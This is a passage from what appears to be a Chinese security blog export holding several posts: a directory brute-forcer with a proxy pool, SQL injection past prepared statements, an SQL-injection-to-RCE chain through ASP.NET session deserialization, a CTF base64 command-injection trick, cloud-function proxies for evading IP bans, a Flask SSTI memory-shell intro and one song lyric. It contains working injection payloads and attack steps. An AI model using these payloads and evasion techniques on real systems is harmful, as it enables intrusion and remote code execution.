生成的简易的用字典撞目录的 python 脚本，其中包含多线程并发和代理池，撞目录的逻辑挺简单的，我们来分析一下多线程和代理池\n这里的代理池我为了方便随便列了几个，但是事实上我们可以从网络接口自动抓取，比如如下代码\nimport requests, randomdef get_proxy_list():    url = &quot;https://www.proxy-list.download/api/v1/get?type=http&quot;    resp = requests.get(url)    proxies = [f&quot;http://&#123;p.strip()&#125;&quot; for p in resp.text.split(&quot;\\n&quot;) if p.strip()]    return proxiesproxies_list = get_proxy_list()print(f&quot;已获取 &#123;len(proxies_list)&#125; 个代理&quot;)\n\n把这个改一改就可以直接套进上面的代码\n下面是实现多线程的核心代码\nq = queue.Queue()  # 任务队列for path in paths:    q.put(path.strip())  # 加入队列# 设置最大线程数max_threads = 10  # 线程池大小（可调整）with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:    # 提交所有任务    future_to_path = &#123;executor.submit(scan_path, q.get()): path for path in paths&#125;    for future in concurrent.futures.as_completed(future_to_path):        result = future.result()        if result:            results.append(result)return &quot;\\n&quot;.join(results)\n\n在 python 中，ThreadPoolExecutor 是标准库 concurrent.futures 提供的一个线程池管理器\nmax_threads = 10with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:\n\n这就表示创建一个最多同时运行 10 个线程的线程池，这里的 10 个线程是主进程的子线程，他们不会立即退出吗，而是等待分配任务， 当 executor.submit() 被调用时，任务会进入内部队列，线程池中的线程会从队列中取出任务执行，在所有的任务完成后，这些线程会随着线程池的关闭而关闭\n而代码中\nq = queue.Queue()for path in paths:    q.put(path.strip())\n\n这里就是在创建一个线程安全的线程，把所有要扫描的路径放进去\nfuture_to_path = &#123;executor.submit(scan_path, q.get()): path for path in paths&#125;\n\n这一行中我们做了两件事\n\n每次循环从q队列中取出一个任务\n将这个任务交给线程池中一个空闲的线程去执行\n\nfor future in concurrent.futures.as_completed(future_to_path):    result = future.result()    if result:        results.append(result)\n\n而通过这个 for 循环可以监听每个任务是否完成\n\nfuture 表示每个任务的执行状态\n当任务完成时，它会进入 as_completed\n主线程再从 future.result() 获取返回值\n再保存到结果列表\n\n那么这时候一定有人会问，为什么不手动创建线程呢，就像下面的代码\nfor path in paths:    t = threading.Thread(target=scan_path, args=(path,))    t.start()\n\n这个虽然也可以实现并发，但是有几个问题：\n\n线程太多会爆内存，然而这个写法不好控制线程数\n难以回收线程与收集结果\n\n在上面代码中还有一段从代理池中随机选择代理的逻辑，每个线程在执行scan_path()时都会独立选择一个代理，互不影响\nproxy = get_random_proxy()proxies = &#123;&quot;http&quot;: proxy, &quot;https&quot;: proxy&#125;response = requests.get(full_url, headers=headers, proxies=proxies, timeout=5)\n\n"},{"title":"SQL预编译——预编译真的能完美防御SQL注入吗","url":"/2025/08/07/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E2%80%94%E2%80%94%E9%A2%84%E7%BC%96%E8%AF%91%E7%9C%9F%E7%9A%84%E8%83%BD%E5%AE%8C%E7%BE%8E%E9%98%B2%E5%BE%A1SQL%E6%B3%A8%E5%85%A5%E5%90%97/","content":"SQL注入原理sql注入是指攻击者拼接恶意SQL语句到接受外部参数的动态SQL查询中，程序本身未对插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。拼接的SQL查询例如，通过在id变量后插入or 1&#x3D;1这样的条件，来绕过身份验证，获得未授权数据的访问权。\nSELECT * FROM user WHERE id = -1 or 1=1\n\n由于or 1&#x3D;1 满足永真结果，sql语句会执行输出user中的全部内容。\n那么这么危险的漏洞，有没有办法进行阻止呢\n有的兄弟，有的\n预编译就能解决大部分的SQL注入问题\n什么是预编译（Prepared Statement）？预编译就是在执行 SQL 前，把 SQL 语句先告诉数据库服务器，编译好结构，然后再单独传参数进去执行！\n它的全名叫：\nPrepared Statement（预处理语句 &#x2F; 预编译语句）\n正常写 SQL 是怎样的？我们先看看普通的拼接 SQL 是怎样的：\nusername = input(&quot;请输入用户名：&quot;)sql = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + username + &quot;&#x27;&quot;cursor.execute(sql)\n\n这就好像直接把“用户输入”和“SQL语句”拼成一整句话。用户只要输入了奇怪的东西，就能控制整个 SQL 的逻辑！Σ(っ °Д °;)っ\n使用预编译是这样写的：username = input(&quot;请输入用户名：&quot;)sql = &quot;SELECT * FROM users WHERE username = ?&quot;cursor.execute(sql, (username,))\n\n**重点就是****SQL 写的时候，用 占位符（?） 或者 命名参数（:name），**参数是后面传进去的！不是拼进去的！\n预编译的执行流程（详细版！）\n**发送 SQL 模板给数据库服务器**比如：\n\nSELECT * FROM users WHERE username = ?\n\n这个时候数据库就把这个 SQL 的结构编译好了，生成了“执行计划”\n\n**服务器把这个语句存起来**存的是“只差参数”的 SQL 模板。\n**客户端发送参数**比如：\n\n(&quot;admin&quot;,)\n\n\n**数据库执行之前编译好的 SQL**把你传进去的参数当成“纯数据”，直接放进语句执行！\n\n为什么这样能防止 SQL 注入？因为参数永远只是值，不会被当作 SQL 代码执行！哪怕用户输入的是：\n&#x27; OR &#x27;1&#x27;=&#x27;1\n\n数据库也会当成一个完整的字符串 &#39; OR &#39;1&#39;=&#39;1 来处理，它不会让它改变 SQL 语句的逻辑结构\n但是预编译真的能完美防御SQL注入吗？笔者在写这篇文章前一直没有思考过这个问题，一是因为知识面浅薄，没有想这么多；二是因为确实没怎么研究过防御漏洞相关的知识，直到翻到了某篇blog预编译与sql注入 – fushulingのblog再谈预编译与sql注入 – fushulingのblog\n假设就用上面的例子，例子中 where语句中的内容是被参数化的。这就是说，预编译仅仅只能防御住可参数化位置的sql注入。那么，对于不可参数化的位置，预编译将没有任何办法。\n那么不可参数化的位置都有哪些？\n表名、列名order by、group bylimitjoin等\n\n我们以order by举例，现在有一个sql语句如下（以下为伪代码）\nSELECT * FROM users ORDER BY &#123;user_input&#125;;\n其中user_input是传递过来的参数，例如 id\n\nSELECT * FROM users ORDER BY id;\n这个语句是正确的，但是如果user_input输入 id;drop table users --\n\nSELECT * FROM users ORDER BY id;drop table users --\n这样就被成功注入了，而这种位置是不可被参数化的，所以是无法通过预编译防御的。\nSQL预编译中order by后为什么不能参数化原因 - 诸子流 - 博客园\n这篇文章中提到\n不能参数化的根本原因2.1 以java为例进行说明典型的java写的sql执行代码片段如下：Connection conn = DBConnect.getConnection();PreparedStatement ps = null;ResultSet rs=null;String sql = &quot; SELECT passwd FROM test_table1 WHERE username = ? &quot;;ps = conn.prepareStatement(sql);# 通过setString()指明该参数是字符串类型ps.setString(1, username);# 另外还有setInt()等一些其他方法# ps.setInt(2, test_param);rs = ps.executeQuery();ps.setString(1, username)会自动给值加上引号。比如假设username=“ls”，那么拼凑成的语句会是String sql = &quot; SELECT passwd FROM test_table1 WHERE username = &#x27;ls&#x27; &quot;;再看order by，order by后一般是接字段名，而字段名是不能带引号的，比如 order by username；如果带上引号成了order by &#x27;username&#x27;，那username就是一个字符串不是字段名了，这就产生了语法错误。所以order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。（至于为什么不弄个能不自动加引号的set方法那就不太懂了）更本质的说法是：不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等。\n\n大概就是说order by的后面是字段，字段不能用引号，但是预编译又只有用引号的setString()这一种方法，所以导致一切是字符串但又不能加引号的位置都不能参数化\n原文以java为例进行说明，但是php中又是怎样呢\n模拟预编译网上一般讲的预编译是这么写的：\n&lt;?php$username = $_POST[&#x27;username&#x27;];$db = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root123&quot;);$stmt = $db-&gt;prepare(&quot;SELECT password FROM test where username= :username&quot;);$stmt-&gt;bindParam(&#x27;:username&#x27;, $username);$stmt-&gt;execute();$result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);var_dump($result);$db = null;?&gt;\n\n这里如果post传参username=root，就可以正常查到值，但是传&#39;root&#39;就查不到，通过查看日志可以发现在sql执行的过程中其实根本没有参数绑定、预编译的过程，本质上只是对符号做了过滤\n这里参考文献中的作者将其称为虚假的预编译\n\n为什么开发者要做一个虚假的预编译呢，那是因为一个参数——PDO::ATTR_EMULATE_PREPARES，这个选项用来配置PDO是否使用模拟预编译，默认是true，因此默认情况下PDO采用的是模拟预编译模式，设置成false以后，才会使用真正的预编译。开启这个选项主要是用来兼容部分不支持预编译的数据库(如sqllite与低版本MySQL)，对于模拟预编译，会由客户端程序内部参数绑定这一过程(而不是数据库)，内部prepare之后再将拼接的sql语句发给数据库执行。\n\n真正的预编译我们在原先的代码上把ATTR_EMULATE_PREPARES设为false取消模拟预编译\n&lt;?php$username = $_POST[&#x27;username&#x27;];$db = new PDO(&quot;mysql:host=localhost;dbname=test&quot;, &quot;root&quot;, &quot;root123&quot;);$db -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$stmt = $db-&gt;prepare(&quot;SELECT password FROM test where username= :username&quot;);$stmt-&gt;bindParam(&#x27;:username&#x27;, $username);$stmt-&gt;execute();$result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);var_dump($result);$db = null;?&gt;\n\n我们post一个username&#x3D;root\n这时数据库中执行的顺序变成了：先连接，然后准备语句，用问号?占位，接着用输入替换问号?执行语句，专业点的说法叫做：\n\n建立连接；\n构建语法树；\n执行\n\n这也是为什么我们之前说的，预编译的作用是让整个语句的功能已经提前定死，消除了sql语句的歧义。当我们输入username&#x3D; ‘root’同样会没有任何输出\n模拟预编译的注入点宽字节注入2023-10-22T13:12:13.619960Z\t    9 Query\tSELECT password FROM test where username= &#x27;\\&#x27;root\\&#x27;&#x27;\n\n从模拟预编译的日志，我们可以发现这里仅仅是用到\\的转义，所以我们是否可以进行宽字节注入呢\n 答案当然是可以的吗，但是我没复现\n没有参数绑定没有参数绑定的预编译等于没有预编译，无论是真编译还是模拟预编译，没有参数绑定等于没编译，并且由于pdo默认支持堆叠注入，我们可以通过堆叠注入先插入值然后查询插入的值获取输出结果。\n这两个的复现具体可以看下面这个文章：\nhttps://fushuling.com/index.php/2023/10/27/%E9%A2%84%E7%BC%96%E8%AF%91%E4%B8%8Esql%E6%B3%A8%E5%85%A5/\n\n对于order by、ground by这种无法进行预编译的场景我们该怎么防御呢，比如Mybaits必须使用${}order by参数，可通过白名单思路对传入的参数进行判断，或者使用间接对象引用，前端传递引用数字等，用于与后端排序参数做数组映射，避免前端直接传入order by参数造成sql注入。\n比如我们想执行select xx order by name，那么前端就不要传入name这个值，而是数字比如1，然后在后端将1与真正想查询的参数name进行对应，然后再执行sql语句。比如映射表为1-&gt;name，2-&gt;age，3-&gt;gender，想要查询order by name、age、gender的结果前端只用传入1、2、3即可，通过防止直接执行用户传入的值来从根本上防止sql注入的产生。\nps：order by后面以及group by 后面的注入，有报错回显的直接报错注入就行了，这个简单，没有报错的话我们可以通过构造布尔条件进行注入：随rand()中值真假的不同，排序出来的结果也是不同的，因此可以通过这个特征进行布尔注入，比如输入rand(ascii(mid((select database()),1,1))&gt;96)，如果成立和不成立输出结果显然是不同的，如果我们成功注入，输出应该是root dingzhen admin的顺序\n","tags":["web安全"]},{"title":"SQL to RCE","url":"/2025/08/23/SQL%20to%20RCE/","content":"\n有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE\n\n就比如我们可以发现某些特殊的数据库：\nDatabase: ASPState[2 tables]+---------------------------------------+| dbo.ASPStateTempApplications          || dbo.ASPStateTempSessions              |+---------------------------------------+\n\n这个数据库的存在用途是用来保存 ASP.NET 网站应用程式的 session。 \n在 ASP.NET 网站应用程式里，Session（会话数据，比如用户登录状态、购物车资料）通常是存放在单一网站应用程式的内存里。也就是说用户访问某个站点时，Session 被保存在那台服务器的内存中，如果用户下次访问还是分配到同一台服务器，那么能顺利找到他的 Seesion\n但如果放在做了负载均衡，网站后面有多台 ASP.NET 应用服务器，对外表现是一个站点，用户的请求会分配到不同的服务器，但每台服务器的 Seesion 并不共享，就会导致用户状态丢失\n为了解决解决上面的问题，就需要集中存储 Seesion，一种常见做法就是所有服务器共享同一份 Seesion 数据\n在 ASP.NET 里，只要在 **web.config** 配置文件中添加相关设定，就可以启用 SQL Server Session 状态存储模式。\n常见的写法：\n&lt;configuration&gt;    &lt;system.web&gt;        &lt;!-- 將 session 保存在 SQL Server 中。 --&gt;        &lt;sessionState            mode=&quot;SQLServer&quot;            sqlConnectionString=&quot;data source=127.0.0.1;user id=&lt;username&gt;;password=&lt;password&gt;&quot;            timeout=&quot;20&quot;        /&gt;        &lt;!-- 预设值，将 seesion 保存在内存中 --&gt;        &lt;!-- &lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&gt; --&gt;        &lt;!-- 将 seesion 保存在 ASP.NET State Service 中，另一种跨服务器共享 seesion 的解决方法 --&gt;        &lt;!--        &lt;sessionState            mode=&quot;StateServer&quot;            stateConnectionString=&quot;tcpip=localhost:42424&quot;            timeout=&quot;20&quot;        /&gt;        --&gt;    &lt;/system.web&gt;&lt;/configuration&gt;\n\n而要在数据库中新建 ASPState 的资料库，可以利用微软自带的小工具 aspnet_regsql 来建立或移除 Session 状态所需的数据库与表，路径在C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_regsql.exe\n# 建立 ASPState 资料库aspnet_regsql.exe -S 127.0.0.1 -U sa -P password -ssadd -sstype p# # 移除 ASPState 数据库aspnet_regsql.exe -S 127.0.0.1 -U sa -P password -ssremove -sstype p\n\n现在我们了解了这些前置信息后，且又可以控制 ASPState 资料库，便可以做到 RCE\nASP.NET 允许我们在 session 中储存一些物件，例如储存一个 List 物件：Session[&quot;secret&quot;] = new List&lt;String&gt;() &#123; &quot;secret string&quot; &#125;，对于如何将这些物件保存到 SQL Server 上，理所当然使用了序列化机制来处理，而我们又控制了数据库，所有也能执行反序列化，为此我们需要先了解 Session 物件序列化与反序列化的过程\n核心操作是通过SqlSessionStateStore.GetItem还原 Session 物件，我们简单了解一下就好，详细的可以看下面的文章\nhttps://paper.seebug.org/1186/\n关键“反序列化链”是怎么打出来的？（1）读表→拿二进制→反序列化\n\nASP.NET 取回 Session 时走 SqlSessionStateStore.GetItem() → 内部执行存储过程 ASPState.dbo.TempGetStateItem3。\n这个 SP 实际上等价于：从 ASPStateTempSessions 取出 **SessionItemShort**（二进制序列化内容）。\n取出来的字节流会传给 SessionStateUtility.DeserializeStoreData(...) 去 反序列化。\n\n（2）反序列化的分支\n\nSessionStateUtility.Deserialize(...) 会先按固定格式读头部字段：\ntimeout（Int32，4字节）\nhasItems（Boolean，1字节）\nhasStaticObjects（Boolean，1字节）\n\n\n然后根据布尔值走两个可能的子反序列化：\nSessionStateItemCollection.Deserialize(...)（针对 Session 里“普通键值”）\nHttpStaticObjectsCollection.Deserialize(...)（针对“静态对象集合”）\n\n\n这里我们选择第二支（HttpStaticObjectsCollection），因为它内部会调用 **AltSerialization.ReadValueFromStream**，而这条链 ysoserial.net 已有“现成 gadget”。\n\nysoserial.net 已经有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出这个利器来使用！下面一行指令就可以产生执行系统指令 calc.exe 的 base64 编码后的 payload\nysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -o base64 -c &quot;calc.exe&quot;\n\n但是这个生成的 payload 还需要加以修饰，ysoserial.net 的 AltSerialization plugin 所建立的 payload 是攻击 SessionStateItemCollection 或 HttpStaticObjectsCollection 两个类别的反序列化操作，而我们储存在资料库中的 session 序列化资料是由在此之上还额外作了一层包装的 SessionStateUtility 类别处理的\n让我们回头看一下程序码，会发现 SessionStateUtility 也只添加了几个 bytes，减化后如下所示\ntimeout = reader.ReadInt32();hasItems = reader.ReadBoolean();hasStaticObjects = reader.ReadBoolean();if (hasStaticObjects)    staticObjects = HttpStaticObjectsCollection.Deserialize(reader);eof = reader.ReadByte();\n\n对于 Int32 要添加 4 个 bytes，Boolean 则是 1 个 byte，而因为要让程式路径能进入 HttpStaticObjectsCollection 的分支，必须让第 6 个 byte 为 1 才能让条件达成，先将原本从 ysoserial.net 产出的 payload 从 base64 转成 hex 表示，再前后各别添加 6、1 bytes，如下示意图：\n  timeout    false  true            HttpStaticObjectsCollection             eof┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff\n\n\n头部补：\n4字节 timeout（随便，可 0）\n1字节 hasItems（设 0，否则会走另一支）\n1字节 hasStaticObjects（**设 ****1**，才能进入 HttpStaticObjectsCollection.Deserialize(...)）\n\n\n中间放：ysoserial 生成的 主体 payload（先从 base64 解出来，再用 hex&#x2F;二进制拼接）。\n尾部补：0xFF（ASP.NET 反序列化校验用的 EOF 标志）。\n\n修饰完的这个 payload 就能用来攻击 SessionStateUtility 类别了\n最后的步骤就是将恶意的序列化内容注入进数据库，如果正常浏览目标网站时有出现 ASP.NET_SessionId 的 Cookie 就代表已经有一笔对应的 Session 记录储存在资料库里，所以我们只需要执行如下的 SQL Update 语句：\nid=1; UPDATE ASPState.dbo.ASPStateTempSessions       SET SessionItemShort = 0x&#123;Hex_Encoded_Payload&#125;       WHERE SessionId LIKE &#x27;&#123;ASP.NET_SessionId&#125;%25&#x27;; --\n\n分别将 &#123;ASP.NET_SessionId&#125; 替换成自己的ASP.NET_SessionId 的 Cookie 值以及 &#123;Hex_Encoded_Payload&#125; 替换成前面准备好的序列化 payload 即可\n假如没有 ASP.NET_SessionId 怎么办？这表示目标还未储存任何资料在 Session 中，那没有 cookie 我们就硬塞一个 cookie 给他，ASP.NET 的 SessionId 是透过乱数产生的 24 个字元，但使用了客制化的字元集，理论上可以直接使用以下的 Python script 产生一组 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之后带上 Cookie: ASP.NET_SessionId&#x3D;plxtfpabykouhu3grwv1j1qw浏览任一个 aspx 页面，理论上 ASP.NET 就会自动在数据库里添加一笔记录\nimport randomchars = &#x27;abcdefghijklmnopqrstuvwxyz012345&#x27;print(&#x27;&#x27;.join(random.choice(chars) for i in range(24)))\n\n等到 Payload 顺利注入后，只要再次用这个 Cookie ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw 浏览任何一个 aspx 页面，就会触发反序列化执行任意系统指令\n","tags":["web安全"]},{"title":"Wie wird man seinen Schatten los？","url":"/2025/08/05/Wie%20wird%20man%20seinen%20Schatten%20los%EF%BC%9F/","content":"Wen soll man fragen , wenn man sich selber nicht versteht ?\n若你不曾了解自己，又该向谁究问何事？ \nWie kann man frei sein , wenn man seinem eigenen Scatten nie entgeht ?\n若你不曾逃离傍身之影，又该从何得到自由解脱？\n\nWas soll mir die Unsterblichkeit ? Vor dem Sterben will ich leben\n不朽于我毫无价值，所求无非向死而生 \nDer Grabgeruch der Lorbeergruft , betäubt mich nieht mehr\n陵墓的腐蠹之气，将不再诱我沉迷\n\nAngst , die mir den Atem raubt , blei auf meinen Schultern\n恐惧扼住咽喉，如枷锁禁锢我的双臂\nSchweign , das mir Fragen stellt,und keine Antwort gibt auf mein Warum\n我向沉默发问，沉默却愈发震耳欲聋\n\nWie wird man Seinen Schatten los ? Wie sagtman seinem Schicksal Nein ?\n你要如何逃离自己的阴影？如何反叛命运？ \nWie Kriecht man aus der eignen Haut ? Wie kann man je ein anderer sein ?\n又要如何冲破自我的桎梏？如何蜕变重生？\n\nWie können wir leben, solang wir nur dem Schicksal dienen?\n只晓屈从命运，何以昂首过活？\nWir können nie, niemals vor unserem eigenen Schatten fliehen!\n直面傍身之影，切莫俯首畏缩！\n","tags":["随笔"]},{"title":"base64解码小trick","url":"/2025/09/15/base64%E8%A7%A3%E7%A0%81%E5%B0%8Ftrick/","content":"N1CTF Junior 2025 2&#x2F;2 中的，也是不出意料没做出来\npython 的 base64 解码逻辑和命令行的 base64 命令是不一致的\nPython 的base64.b64decode(..., validate=True)在遇到 padding（=）后还有额外的 base64 字符，会报错，而用默认解码base64.b64decode(...)时，只会解出等号前的那一部分\n但是命令行中会将两段都成功解出并拼接\n这是因为 Base64 的编码本质上是一系列 4 字符为一组的字符块，最后一组可能用 = 填充以满足块对齐，根据解析器类型的不同，解析方法也会有区别\n\n**严格解析器（Python 的 ****validate=True**）：一旦遇到合法的填充字符 =，就认为这是该 base64 段的结束；如果填充后仍有数据，会报错为“padding 之后有额外数据”\n宽松&#x2F;流式解析器（GNU **base64 -d** 等）：通常会把整个输入当作可能包含多个 base64 段（或忽略某些格式约束），会尽量解出每一段能解的部分，因此出现“先解出第一段，到 padding 再继续解出第二段并拼接”这种行为。实现细节取决于具体工具&#x2F;版本，但 GNU coreutils 的实现就是允许这种拼接\n\n复现：python -c &quot;import base64;print(base64.b64decode(&#x27;MS4xLjEuMQ==O1BST09G&#x27;))&quot;\n\n当我们在命令行运行这段代码，只会返回b&#39;1.1.1.1&#39;（只解出第一个块）  \necho &#x27;MS4xLjEuMQ==O1BST09G&#x27; | base64 -d\n\n这个会输出两段拼接的解码结果：1.1.1.1;PROOF\n回到题目：\nPing核心代码：\ndef run_ping(ip_base64):    try:        decoded_ip = base64.b64decode(ip_base64).decode(&#x27;utf-8&#x27;)        ifnot re.match(r&#x27;^\\d+\\.\\d+\\.\\d+\\.\\d+$&#x27;, decoded_ip):            returnFalse        if decoded_ip.count(&#x27;.&#x27;) != 3:            returnFalse                ifnot all(0 &lt;= int(part) &lt; 256for part in decoded_ip.split(&#x27;.&#x27;)):            returnFalse        ifnot ipaddress.ip_address(decoded_ip):            returnFalse        if len(decoded_ip) &gt; 15:            returnFalse        ifnot re.match(r&#x27;^[A-Za-z0-9+/=]+$&#x27;, ip_base64):            returnFalse    except Exception as e:        returnFalse    command = f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;&#123;ip_base64&#125;&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;    try:        process = subprocess.run(            command,            shell=True,            check=True,            capture_output=True,            text=True        )        return process.stdout    except Exception as e:        returnFalse\n\n对用户传入的 base64 的 ip 解码后进行审查，然后放入 command 中进行 base64，根据上面的 trick 我们直接构造 payload：\nMS4xLjEuMQ==OyBjYXQgL2ZsYWc=\n\n","tags":["web安全"]},{"title":"云函数实现代理绕过ip封锁","url":"/2025/08/05/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87ip%E5%B0%81%E9%94%81/","content":"云函数可以用来搭建一个轻量代理池或 IP 中转机制，原理上跟传统代理池类似，虽然匿名性不如高匿商业代理，但在做扫描器等任务时依然方便实用，前提是控制好访问频率和风险\n配置函数代码# -*- coding: utf8 -*-import jsonimport picklefrom base64 import b64decode, b64encodeimport requestsSCF_TOKEN = &quot;TOKEN&quot; #需要自定义随机值，用于鉴权def authorization():    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 401,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: &quot;Please provide correct SCF-Token&quot;,    &#125;def main_handler(event: dict, context: dict):    try:        token = event[&quot;headers&quot;][&quot;scf-token&quot;]    except KeyError:        return authorization()    if token != SCF_TOKEN:        return authorization()    data = event[&quot;body&quot;]    kwargs = json.loads(data)    kwargs[&#x27;data&#x27;] = b64decode(kwargs[&#x27;data&#x27;])    r = requests.request(**kwargs, verify=False, allow_redirects=False)    serialized_resp = pickle.dumps(r)    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 200,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: b64encode(serialized_resp).decode(&quot;utf-8&quot;),    &#125;\n\n接下来创建函数URL，替代触发器的作用，因为触发器中的API网关类型下线了，不过可以直接使用函数URL来调用对应的云函数\n\n这样就能通过这个API调用我们部署的云函数了\n\n部署客户端本地 windows 端本地代理使用 mitmproxy，可以直接 pip 安装\npip3 install mitmproxy\n\n如果需要代理 HTTPS流量的话，需安装证书\n安装好了mitmproxy后，首次运行 mitmdump命令，证书就会自动生成在在 ~&#x2F;.mitmproxy中，一般在C:\\Users\\xxx.mitmproxy\\ 目录下，双击运行就能安装了\n下面配置客户端client.py代码，需要将前面配置的函数URL，也就是触发云函数的API接口，添加至 client.py 中 scf_servers变量中\n# -*- coding: utf8 -*-# 命名只能是client.pyimport jsonimport picklefrom typing import Listfrom random import choicefrom urllib.parse import urlparsefrom base64 import b64encode, b64decodeimport mitmproxyscf_servers: List[str] = [&quot;https://111111-zzzzz.ap-beijing.tencentscf.com&quot;,&quot;http://111111-zzzzz.ap-beijing.tencentscf.com&quot;] #API接口地址，也就是函数URLSCF_TOKEN = &quot;TOKEN&quot; #与server.py保持一致def request(flow: mitmproxy.http.HTTPFlow):    scf_server = choice(scf_servers)    r = flow.request    data = &#123;        &quot;method&quot;: r.method,        &quot;url&quot;: r.pretty_url,        &quot;headers&quot;: dict(r.headers),        &quot;cookies&quot;: dict(r.cookies),        &quot;params&quot;: dict(r.query),        &quot;data&quot;: b64encode(r.raw_content).decode(&quot;ascii&quot;),    &#125;    flow.request = flow.request.make(        &quot;POST&quot;,        url=scf_server,        content=json.dumps(data),        headers=&#123;            &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,            &quot;Accept-Encoding&quot;: &quot;gzip, deflate, compress&quot;,            &quot;Accept-Language&quot;: &quot;en-us;q=0.8&quot;,            &quot;Cache-Control&quot;: &quot;max-age=0&quot;,            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;,            &quot;Connection&quot;: &quot;close&quot;,            &quot;Host&quot;: urlparse(scf_server).netloc,            &quot;SCF-Token&quot;: SCF_TOKEN,        &#125;,    )def response(flow: mitmproxy.http.HTTPFlow):    if flow.response.status_code != 200:        mitmproxy.ctx.log.warn(&quot;Error&quot;)    if flow.response.status_code == 401:        flow.response.headers = Headers(content_type=&quot;text/html;charset=utf-8&quot;)        return    if flow.response.status_code == 433:        flow.response.headers = Headers(content_type=&quot;text/html;charset=utf-8&quot;)        flow.response.text = &quot;&lt;html&gt;&lt;body&gt;操作超时，可在函数配置中修改执行超时时间&lt;/body&gt;&lt;/html&gt;&quot;        return    if flow.response.status_code == 200:        body = flow.response.content.decode(&quot;utf-8&quot;)        resp = pickle.loads(b64decode(body))        r = flow.response.make(            status_code=resp.status_code,            headers=dict(resp.headers),            content=resp.content,        )        flow.response = r\n\n以上全部配置好之后，就可以开启本地代理了\nmitmdump -s client.py -p 9999 --no-http2\n\n到此我们本地 9999 端口就开启了一个代理的入口，然后我们让想走代理的应用经过这个 9999 端口，就能调用部署好的云函数了，利用云函数的多出口特性，就达到了每次请求别人我们的ip都不一样，就模拟出了代理池的部分效果\n","tags":["云安全"]},{"title":"python 内存马","url":"/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/","content":"之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整\nFlask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞\n在 Flask 中，使用 render_template_string() 渲染模板时，若将用户输入直接传入而未做过滤处理，就可能导致 SSTI 漏洞。攻击者可通过该漏洞注入恶意模板代码，从而实现 代码执行，甚至进一步植入 内存马\n内存马注入原理（Flask 路由机制）Flask 常规注册路由的方式是通过装饰器 @app.route()，但底层实际是调用了：\nself.add_url_rule(rule, endpoint=None, view_func=None)\n\n各参数说明如下：\n\nrule：URL 路径（必须以 / 开头），与 @app.route() 中的路径一致\nendpoint：视图函数的唯一标识，在使用 url_for() 反向生成 URL 时会用到，默认为函数名\nview_func：绑定的视图函数（关键参数），可以是函数名，也可以是匿名函数（lambda）\n\n 因此，只要能通过 SSTI 或其他 RCE 手段执行 add_url_rule() 并注入恶意 view_func，就可以动态注册一个后门路由，实现命令执行或内存马植入。 \nFlask 上下文机制（Context）要动态注册路由并执行命令，核心在于控制 **view_func** 的行为。通常可使用 匿名函数 lambda 来实现远程命令执行：\nlambda: os.popen(request.args.get(&#x27;cmd&#x27;)).read()\n\n这需要依赖 Flask 的上下文机制（Context）：\nFlask 中的上下文分为两类：\n\n请求上下文（Request Context）：包含请求相关的数据，如 request, session, g 等\n应用上下文（Application Context）：包含全局应用状态，如 current_app, app 等\n\n 当一个 HTTP 请求进入 Flask 应用时，Flask 会自动：  \n\n实例化一个 Request Context\n**Request Context **包含在 Request 对象中，并被推入 _request_ctx_stack 栈结构\n获取当前请求对象，即可通过 _request_ctx_stack.top 获取当前上下文\n\n这使得我们在构造 payload 时，能访问如 request, app, os 等对象并执行逻辑\n漏洞环境这里我们从 https://xz.aliyun.com/news/10381 这篇文章找一个漏洞环境 demo 来实验\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world():  # put application&#x27;s code here    person = &#x27;knave&#x27;    if request.args.get(&#x27;name&#x27;):        person = request.args.get(&#x27;name&#x27;)    template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % person    return render_template_string(template)if __name__ == &#x27;__main__&#x27;:    app.run()\n\n原始 Flask 内存马 